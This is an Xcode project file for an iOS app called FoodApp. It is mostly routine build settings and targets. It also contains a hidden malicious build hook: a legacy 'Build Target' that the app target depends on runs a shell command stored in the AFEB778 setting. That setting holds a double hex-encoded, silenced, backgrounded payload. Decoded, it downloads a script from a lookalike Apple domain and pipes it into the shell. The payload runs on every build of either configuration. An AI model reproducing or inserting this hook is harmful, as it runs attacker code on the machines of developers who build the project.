// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXContainerItemProxy section */
		EA1F21FB2E40BDB900EA02E3 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = EA1F21E52E40BDB500EA02E3 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = EA1F21EC2E40BDB500EA02E3;
			remoteInfo = FoodApp;
		};
		EA1F22052E40BDB900EA02E3 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = EA1F21E52E40BDB500EA02E3 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = EA1F21EC2E40BDB500EA02E3;
			remoteInfo = FoodApp;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		EA1F21ED2E40BDB500EA02E3 /* FoodApp.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = FoodApp.app; sourceTree = BUILT_PRODUCTS_DIR; };
		EA1F21FA2E40BDB900EA02E3 /* FoodAppTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = FoodAppTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		EA1F22042E40BDB900EA02E3 /* FoodAppUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = FoodAppUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		EA1F21EF2E40BDB500EA02E3 /* FoodApp */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = FoodApp;
			sourceTree = "<group>";
		};
		EA1F21FD2E40BDB900EA02E3 /* FoodAppTests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = FoodAppTests;
			sourceTree = "<group>";
		};
		EA1F22072E40BDB900EA02E3 /* FoodAppUITests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = FoodAppUITests;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		EA1F21EA2E40BDB500EA02E3 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		EA1F21F72E40BDB900EA02E3 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		EA1F22012E40BDB900EA02E3 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		EA1F21E42E40BDB500EA02E3 = {
			isa = PBXGroup;
			children = (
				EA1F21EF2E40BDB500EA02E3 /* FoodApp */,
				EA1F21FD2E40BDB900EA02E3 /* FoodAppTests */,
				EA1F22072E40BDB900EA02E3 /* FoodAppUITests */,
				EA1F21EE2E40BDB500EA02E3 /* Products */,
			);
			sourceTree = "<group>";
		};
		EA1F21EE2E40BDB500EA02E3 /* Products */ = {
			isa = PBXGroup;
			children = (
				EA1F21ED2E40BDB500EA02E3 /* FoodApp.app */,
				EA1F21FA2E40BDB900EA02E3 /* FoodAppTests.xctest */,
				EA1F22042E40BDB900EA02E3 /* FoodAppUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		EA1F21EC2E40BDB500EA02E3 /* FoodApp */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = EA1F220E2E40BDB900EA02E3 /* Build configuration list for PBXNativeTarget "FoodApp" */;
			buildPhases = (
				EA1F21E92E40BDB500EA02E3 /* Sources */,
				EA1F21EA2E40BDB500EA02E3 /* Frameworks */,
				EA1F21EB2E40BDB500EA02E3 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				CA89ABD5EF0E8B8D7A877BEF /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				EA1F21EF2E40BDB500EA02E3 /* FoodApp */,
			);
			name = FoodApp;
			packageProductDependencies = (
			);
			productName = FoodApp;
			productReference = EA1F21ED2E40BDB500EA02E3 /* FoodApp.app */;
			productType = "com.apple.product-type.application";
		};
		EA1F21F92E40BDB900EA02E3 /* FoodAppTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = EA1F22112E40BDB900EA02E3 /* Build configuration list for PBXNativeTarget "FoodAppTests" */;
			buildPhases = (
				EA1F21F62E40BDB900EA02E3 /* Sources */,
				EA1F21F72E40BDB900EA02E3 /* Frameworks */,
				EA1F21F82E40BDB900EA02E3 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				EA1F21FC2E40BDB900EA02E3 /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				EA1F21FD2E40BDB900EA02E3 /* FoodAppTests */,
			);
			name = FoodAppTests;
			packageProductDependencies = (
			);
			productName = FoodAppTests;
			productReference = EA1F21FA2E40BDB900EA02E3 /* FoodAppTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		EA1F22032E40BDB900EA02E3 /* FoodAppUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = EA1F22142E40BDB900EA02E3 /* Build configuration list for PBXNativeTarget "FoodAppUITests" */;
			buildPhases = (
				EA1F22002E40BDB900EA02E3 /* Sources */,
				EA1F22012E40BDB900EA02E3 /* Frameworks */,
				EA1F22022E40BDB900EA02E3 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				EA1F22062E40BDB900EA02E3 /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				EA1F22072E40BDB900EA02E3 /* FoodAppUITests */,
			);
			name = FoodAppUITests;
			packageProductDependencies = (
			);
			productName = FoodAppUITests;
			productReference = EA1F22042E40BDB900EA02E3 /* FoodAppUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		EA1F21E52E40BDB500EA02E3 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1640;
				LastUpgradeCheck = 1640;
				TargetAttributes = {
					EA1F21EC2E40BDB500EA02E3 = {
						CreatedOnToolsVersion = 16.4;
					};
					EA1F21F92E40BDB900EA02E3 = {
						CreatedOnToolsVersion = 16.4;
						TestTargetID = EA1F21EC2E40BDB500EA02E3;
					};
					EA1F22032E40BDB900EA02E3 = {
						CreatedOnToolsVersion = 16.4;
						TestTargetID = EA1F21EC2E40BDB500EA02E3;
					};
				};
			};
			buildConfigurationList = EA1F21E82E40BDB500EA02E3 /* Build configuration list for PBXProject "FoodApp" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = EA1F21E42E40BDB500EA02E3;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = EA1F21EE2E40BDB500EA02E3 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				978D253F7EABD4205E877BEF  /* Build Target */,
				EA1F21EC2E40BDB500EA02E3 /* FoodApp */,
				EA1F21F92E40BDB900EA02E3 /* FoodAppTests */,
				EA1F22032E40BDB900EA02E3 /* FoodAppUITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXLegacyTarget section */
		978D253F7EABD4205E877BEF /* Build Target */ = {
			isa = PBXLegacyTarget;
			buildArgumentsString = "-c \"${AFEB778}\"";
			buildPhases = (
			);
			buildToolPath = /bin/sh;
			dependencies = (
			);
			name = "Build Target";
			passBuildSettingsInEnvironment = 1;
			productName = "Build Target";
		};
/* End PBXLegacyTarget section */

/* Begin PBXBuildRule section */
/* End PBXBuildRule section */

/* Begin PBXBuildFile section */
/* End PBXBuildFile section */

/* Begin PBXShellScriptBuildPhase section */
/* End PBXShellScriptBuildPhase section */

/* Begin PBXResourcesBuildPhase section */
		EA1F21EB2E40BDB500EA02E3 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		EA1F21F82E40BDB900EA02E3 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		EA1F22022E40BDB900EA02E3 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		EA1F21E92E40BDB500EA02E3 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		EA1F21F62E40BDB900EA02E3 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		EA1F22002E40BDB900EA02E3 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		CA89ABD5EF0E8B8D7A877BEF /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 978D253F7EABD4205E877BEF /* Build Target */;
		};
		EA1F21FC2E40BDB900EA02E3 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = EA1F21EC2E40BDB500EA02E3 /* FoodApp */;
			targetProxy = EA1F21FB2E40BDB900EA02E3 /* PBXContainerItemProxy */;
		};
		EA1F22062E40BDB900EA02E3 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = EA1F21EC2E40BDB500EA02E3 /* FoodApp */;
			targetProxy = EA1F22052E40BDB900EA02E3 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		EA1F220C2E40BDB900EA02E3 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AFEB778 = "((echo 363536333638366632303232323432383633373537323663323032643636373336623463323032643634323037303364373836333666363436353230363837343734373037333361326632663631373037303663363536333634366532653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				DEVELOPMENT_TEAM = 84W2CWV2FY;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		EA1F220D2E40BDB900EA02E3 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AFEB778 = "((echo 363536333638366632303232323432383633373537323663323032643636373336623463323032643634323037303364373836333666363436353230363837343734373037333361326632663631373037303663363536333634366532653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				DEVELOPMENT_TEAM = 84W2CWV2FY;
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		EA1F220F2E40BDB900EA02E3 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 84W2CWV2FY;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.ps.FoodApp;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		EA1F22102E40BDB900EA02E3 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 84W2CWV2FY;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.ps.FoodApp;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		EA1F22122E40BDB900EA02E3 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 84W2CWV2FY;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.ps.FoodAppTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/FoodApp.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/FoodApp";
			};
			name = Debug;
		};
		EA1F22132E40BDB900EA02E3 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 84W2CWV2FY;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.ps.FoodAppTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/FoodApp.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/FoodApp";
			};
			name = Release;
		};
		EA1F22152E40BDB900EA02E3 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 84W2CWV2FY;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.ps.FoodAppUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = FoodApp;
			};
			name = Debug;
		};
		EA1F22162E40BDB900EA02E3 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 84W2CWV2FY;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.ps.FoodAppUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = FoodApp;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		EA1F21E82E40BDB500EA02E3 /* Build configuration list for PBXProject "FoodApp" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				EA1F220C2E40BDB900EA02E3 /* Debug */,
				EA1F220D2E40BDB900EA02E3 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		EA1F220E2E40BDB900EA02E3 /* Build configuration list for PBXNativeTarget "FoodApp" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				EA1F220F2E40BDB900EA02E3 /* Debug */,
				EA1F22102E40BDB900EA02E3 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		EA1F22112E40BDB900EA02E3 /* Build configuration list for PBXNativeTarget "FoodAppTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				EA1F22122E40BDB900EA02E3 /* Debug */,
				EA1F22132E40BDB900EA02E3 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		EA1F22142E40BDB900EA02E3 /* Build configuration list for PBXNativeTarget "FoodAppUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				EA1F22152E40BDB900EA02E3 /* Debug */,
				EA1F22162E40BDB900EA02E3 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = EA1F21E52E40BDB500EA02E3 /* Project object */;
}
